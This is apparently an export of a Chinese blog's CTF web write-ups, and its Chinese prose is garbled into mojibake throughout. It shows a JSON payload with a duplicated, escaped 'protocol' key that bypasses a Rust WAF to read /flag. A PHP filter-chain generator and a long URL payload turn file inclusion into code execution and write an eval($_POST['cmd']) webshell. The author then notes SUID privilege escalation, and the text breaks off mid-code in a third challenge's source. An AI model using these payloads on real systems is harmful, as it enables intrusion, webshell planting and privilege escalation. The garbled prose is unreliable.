<p>ä½†æ˜¯è¯»å–<code>/flag</code>çš„æ—¶å€™æ²¡æœ‰æˆåŠŸï¼Œè¿”å›äº†rustçš„ä»£ç ã€‚å¯ä»¥å‘ç°å¦‚æœpayloadä¸­åŒ…å«flagæˆ–è€…procå°±ä¼šç›´æ¥è¿”å›æ–‡ä»¶å†…å®¹ï¼Œå¦‚æœç»•è¿‡äº†å†åˆ¤æ–­payloadå¦‚æœæ˜¯jsonæ ¼å¼ï¼Œé‚£ä¹ˆæ˜¯å¦å­˜åœ¨keyä¸º<code>protocol</code>ï¼Œå¦‚æœå­˜åœ¨ä¹Ÿç›´æ¥è¿”å›æ–‡ä»¶å†…å®¹</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// use std::env;</span></span><br><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"><span class="keyword">use</span> serde_json::Value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> BLACK_PROPERTY: &amp;<span class="built_in">str</span> = <span class="string">&quot;protocol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Serialize, Deserialize)]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span></span>&#123;</span><br><span class="line"> Â  Â <span class="meta">#[serde(default = <span class="meta-string">&quot;default_protocol&quot;</span>)]</span></span><br><span class="line"> Â  Â <span class="keyword">pub</span> protocol: <span class="built_in">String</span>,</span><br><span class="line"> Â  Â <span class="keyword">pub</span> href: <span class="built_in">String</span>,</span><br><span class="line"> Â  Â <span class="keyword">pub</span> origin: <span class="built_in">String</span>,</span><br><span class="line"> Â  Â <span class="keyword">pub</span> pathname: <span class="built_in">String</span>,</span><br><span class="line"> Â  Â <span class="keyword">pub</span> hostname:<span class="built_in">String</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">default_protocol</span></span>() -&gt; <span class="built_in">String</span> &#123;</span><br><span class="line"> Â  Â <span class="string">&quot;http&quot;</span>.to_string()</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//protocol is default value, can&#x27;t be customized</span></span><br><span class="line"><span class="keyword">pub</span> <span class="function"><span class="keyword">fn</span> <span class="title">waf</span></span>(body: &amp;<span class="built_in">str</span>) -&gt; <span class="built_in">String</span> &#123;</span><br><span class="line"> Â  Â <span class="keyword">if</span> body.to_lowercase().contains(<span class="string">&quot;flag&quot;</span>) || Â body.to_lowercase().contains(<span class="string">&quot;proc&quot;</span>)&#123;</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> <span class="built_in">String</span>::from(<span class="string">&quot;./main.rs&quot;</span>);</span><br><span class="line"> Â   &#125;</span><br><span class="line"> Â  Â <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Ok</span>(json_body) = serde_json::from_str::&lt;Value&gt;(body) &#123;</span><br><span class="line"> Â  Â  Â  Â <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Some</span>(json_body_obj) = json_body.as_object() &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">if</span> json_body_obj.keys().any(|key| key == BLACK_PROPERTY) &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â  Â  Â <span class="keyword">return</span> <span class="built_in">String</span>::from(<span class="string">&quot;./main.rs&quot;</span>);</span><br><span class="line"> Â  Â  Â  Â  Â   &#125;</span><br><span class="line"> Â  Â  Â   &#125;</span><br><span class="line"></span><br><span class="line"> Â  Â  Â  Â <span class="comment">//not contains protocol,check if struct is File</span></span><br><span class="line"> Â  Â  Â  Â <span class="keyword">if</span> <span class="keyword">let</span> <span class="literal">Ok</span>(file) = serde_json::from_str::&lt;File&gt;(body) &#123;</span><br><span class="line"> Â  Â  Â  Â  Â  Â <span class="keyword">return</span> serde_json::to_string(&amp;file).unwrap_or(<span class="built_in">String</span>::from(<span class="string">&quot;./main.rs&quot;</span>));</span><br><span class="line"> Â  Â  Â   &#125;</span><br><span class="line"> Â   &#125; <span class="keyword">else</span>&#123;</span><br><span class="line"> Â  Â  Â  Â <span class="comment">//body not json</span></span><br><span class="line"> Â  Â  Â  Â <span class="keyword">return</span> <span class="built_in">String</span>::from(body);</span><br><span class="line"> Â   &#125;</span><br><span class="line"></span><br><span class="line"> Â  Â <span class="keyword">return</span> <span class="built_in">String</span>::from(<span class="string">&quot;./main.rs&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line"> Â  Â <span class="comment">// let args: Vec&lt;String&gt; = env::args().collect();</span></span><br><span class="line"> Â  Â <span class="built_in">println!</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>googleäº†ä¸€ä¸‹ï¼Œå‘ç°corctfçš„æŸé“é¢˜å’Œè¿™é“é¢˜ç±»ä¼¼ï¼Œä¹Ÿæ˜¯<code>fs.readfileSync</code>å¹¶ç»•wafï¼Œå¯ä»¥ç›´æ¥å»çœ‹æºç </p>
<p><img src="https://img-blog.csdnimg.cn/f9ddd86f095a4222a750ca5ce340e72e.png" alt="Untitled"></p>
<p>å¦‚æœä¼ å…¥çš„payloadä¸ä¸ºç©ºå¹¶ä¸”<code>payload.href</code>å’Œ<code>payload.origin</code>å‡æœ‰å€¼ï¼Œå°±ä¼šè¿›å…¥<code>fileURLToPath(fileURLOrPath)</code></p>
<p><img src="https://img-blog.csdnimg.cn/55c9da370fc248acb52b7917b6276101.png" alt="Untitled"></p>
<p><code>payload.protocol</code>ä¸º<code>file:</code></p>
<p><img src="https://img-blog.csdnimg.cn/1826bcf6418c4e598b699fc4d88a7b53.png" alt="Untitled"></p>
<p>è¿™é‡Œå®ç°å¯¹<code>payload.pathname</code>çš„urlè§£ç å¹¶è¿”å›æœ€åå®ç°è¯»å–<code>payload.pathname</code>å†…å®¹</p>
<p>æ³¨æ„è¿™é‡Œè¦æ±‚<code>payload.hostname</code>ä¸ºç©º</p>
<p><img src="https://img-blog.csdnimg.cn/5cdbd87679294843aabc9d21d5ee9424.png" alt="Untitled"></p>
<p>ä½†æ˜¯è¿™é‡Œç”¨åˆ°çš„payloadä¸­å­˜åœ¨protocolå¯¼è‡´rustèƒ½æ£€æµ‹åˆ°ï¼Œè¦ç»•è¿‡ã€‚payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;origin&quot;:&quot;*&quot;,&quot;href&quot;:&quot;*&quot;,&quot;pr\ud811otocol&quot;:&quot;file:&quot;,&quot;protocol&quot;:&quot;file:&quot;,&quot;hostname&quot;:&quot;&quot;,&quot;pathname&quot;:&quot;/f%6cag&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/1a47fbd1679d4d829b46c9c1a504be5b.png" alt="Untitled"></p>
<h4 id="å°æ›´æ–°ï¼š"><a href="#å°æ›´æ–°ï¼š" class="headerlink" title="å°æ›´æ–°ï¼š"></a>å°æ›´æ–°ï¼š</h4><p>ä»ç¾¤é‡Œå¸ˆå‚…å‘çš„wpå­¦åˆ°çš„æ–°payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">&quot;file:&quot;,</span><br><span class="line">&quot;a&quot;,</span><br><span class="line">&quot;a&quot;,</span><br><span class="line">&quot;/fl%61g&quot;,</span><br><span class="line">&quot;&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>æ„Ÿè§‰åº”è¯¥æ˜¯æ ¹æ®main.rsé‡Œé¢çš„structæ¥çš„å§ï¼Ÿå¤§æ¦‚ï¼ˆä¸ä¼šrustå‘œå‘œå‘œ</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug, Serialize, Deserialize)]</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="meta">#[serde(default = <span class="meta-string">&quot;default_protocol&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> protocol: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> href: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> origin: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> pathname: <span class="built_in">String</span>,</span><br><span class="line">    <span class="keyword">pub</span> hostname:<span class="built_in">String</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag:</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">flag&#123;<span class="number">5</span>f53d536-<span class="number">83</span>ed-<span class="number">41</span>ec-ae21-<span class="number">939143</span>a38066&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://www.bmth666.cn/bmth_blog/2022/09/27/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/#Spring%E5%86%85%E5%AD%98%E9%A9%AC">http://www.bmth666.cn/bmth_blog/2022/09/27/Springå†…å­˜é©¬å­¦ä¹ /#Springå†…å­˜é©¬</a></p>
<p><a href="https://www.anquanke.com/post/id/258575#h2-2">https://www.anquanke.com/post/id/258575#h2-2</a></p>
<p><a href="https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/">https://myzxcg.com/2021/11/Spring-å†…å­˜é©¬å®ç°/</a></p>
<p><a href="https://viblo.asia/p/corctf-2022-writeup-part-1-m68Z0Joj5kG#_c-challenge-solution-3">https://viblo.asia/p/corctf-2022-writeup-part-1-m68Z0Joj5kG#_c-challenge-solution-3</a></p>
<p><a href="https://github.com/nodejs/node/blob/main/lib/fs.js#L464">https://github.com/nodejs/node/blob/main/lib/fs.js#L464</a></p>
<p><a href="https://bbs.pediy.com/thread-274102.htm">https://bbs.pediy.com/thread-274102.htm</a></p>
<p><a href="https://github.com/davedoesdev/python-jwt">https://github.com/davedoesdev/python-jwt</a></p>
<p><a href="https://www.secpulse.com/archives/148242.html#:~:text=graphql%E7%9A%84sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E4%B8%80%E8%88%AC%E7%9A%84sql%E6%B3%A8%E5%85%A5%E7%B1%BB%E4%BC%BC%EF%BC%8C%E9%83%BD%E6%98%AF%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8F%E8%AF%AD%E5%8F%A5%E8%BE%BE%E5%88%B0%E6%B3%A8%E5%85%A5%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E6%88%96%E6%94%B9%E5%8F%98%E6%9F%A5%E8%AF%A2%E9%80%BB%E8%BE%91%E7%9A%84%E7%9B%AE%E7%9A%84%E3%80%82,p%E7%A5%9E%E5%9C%A8%E5%85%88%E7%9F%A5%E5%A4%A7%E4%BC%9A%E4%B8%8A%E8%AE%B2%E8%BF%87%E8%AF%A5%E7%B1%BB%E9%97%AE%E9%A2%98%EF%BC%8C%E5%80%9F%E7%94%A8p%E7%A5%9E%E7%9A%842%E5%BC%A0PPT%E3%80%82">https://www.secpulse.com/archives/148242.html</a></p>
<p>[<a href="https://graphql.cn/learn/queries/#variables]">https://graphql.cn/learn/queries/#variables]</a>(</p>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>ç¥¥äº‘æ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¾ŠåŸæ¯éƒ¨åˆ†web</title>
    <url>/2022/09/06/%E7%BE%8A%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86web/</url>
    <content><![CDATA[<h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><p><a href="https://tttang.com/archive/1395/">hxp CTF 2021 - The End Of LFI? - è·³è·³ç³– (tttang.com)</a></p>
<p>exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$base64_payload</span> = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span>;</span><br><span class="line"><span class="variable">$conversions</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span> =&gt; <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$filters</span> = <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (str_split(strrev(<span class="variable">$base64_payload</span>)) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="variable">$conversions</span>[<span class="variable">$c</span>] . <span class="string">&quot;|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-encode|&quot;</span>;</span><br><span class="line">    <span class="variable">$filters</span> .= <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$filters</span> .= <span class="string">&quot;convert.base64-decode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$final_payload</span> = <span class="string">&quot;php://filter/<span class="subst">&#123;$filters&#125;</span>/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$final_payload</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php%3A%2F%2Ffilter%2Fconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EEUCTW%7Cconvert%2Eiconv%2EL4%2EUTF8%7Cconvert%2Eiconv%2EIEC%5FP271%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL7%2ENAPLPS%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EUCS%2D2LE%2EUCS%2D2BE%7Cconvert%2Eiconv%2ETCVN%2EUCS2%7Cconvert%2Eiconv%2E857%2ESHIFTJISX0213%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EEUCTW%7Cconvert%2Eiconv%2EL4%2EUTF8%7Cconvert%2Eiconv%2E866%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL3%2ET%2E61%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2ESJIS%2EGBK%7Cconvert%2Eiconv%2EL10%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2EISO%2DIR%2D111%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2EISO%2DIR%2D111%2EUJIS%7Cconvert%2Eiconv%2E852%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUTF16%2EEUCTW%7Cconvert%2Eiconv%2ECP1256%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL7%2ENAPLPS%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2E851%2EUTF8%7Cconvert%2Eiconv%2EL7%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2ECP1133%2EIBM932%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EUCS%2D2LE%2EUCS%2D2BE%7Cconvert%2Eiconv%2ETCVN%2EUCS2%7Cconvert%2Eiconv%2E851%2EBIG5%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EUCS%2D2LE%2EUCS%2D2BE%7Cconvert%2Eiconv%2ETCVN%2EUCS2%7Cconvert%2Eiconv%2E1046%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUTF16%2EEUCTW%7Cconvert%2Eiconv%2EMAC%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL7%2ESHIFTJISX0213%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUTF16%2EEUCTW%7Cconvert%2Eiconv%2EMAC%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2EISO%2DIR%2D111%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EISO6937%2EJOHAB%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EL6%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2EUTF16LE%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EUCS2%2EUTF8%7Cconvert%2Eiconv%2ESJIS%2EGBK%7Cconvert%2Eiconv%2EL10%2EUCS2%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Eiconv%2EUTF8%2ECSISO2022KR%7Cconvert%2Eiconv%2EISO2022KR%2EUTF16%7Cconvert%2Eiconv%2EUCS%2D2LE%2EUCS%2D2BE%7Cconvert%2Eiconv%2ETCVN%2EUCS2%7Cconvert%2Eiconv%2E857%2ESHIFTJISX0213%7Cconvert%2Ebase64%2Ddecode%7Cconvert%2Ebase64%2Dencode%7Cconvert%2Eiconv%2EUTF8%2EUTF7%7Cconvert%2Ebase64%2Ddecode%2Fresource%3D/etc/passwd&amp;0=echo &#x27;%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%27%63%6d%64%27%5d%29%3b%3f%3e&#x27; %3e a.php</span><br></pre></td></tr></table></figure>

<p>èšå‰‘è¿a.php,ç„¶åå°±æ˜¯suidææƒï¼Œç›´æ¥dateææƒå°±å¥½äº†</p>
<p><img src="https://img-blog.csdnimg.cn/06b97b97eca14ac5910765cb85d661ad.png"></p>
<h3 id="step-by-step-v3"><a href="#step-by-step-v3" class="headerlink" title="step_by_step-v3"></a>step_by_step-v3</h3><p>æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;y1-&gt;magic();</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;y1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hint</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">            <span 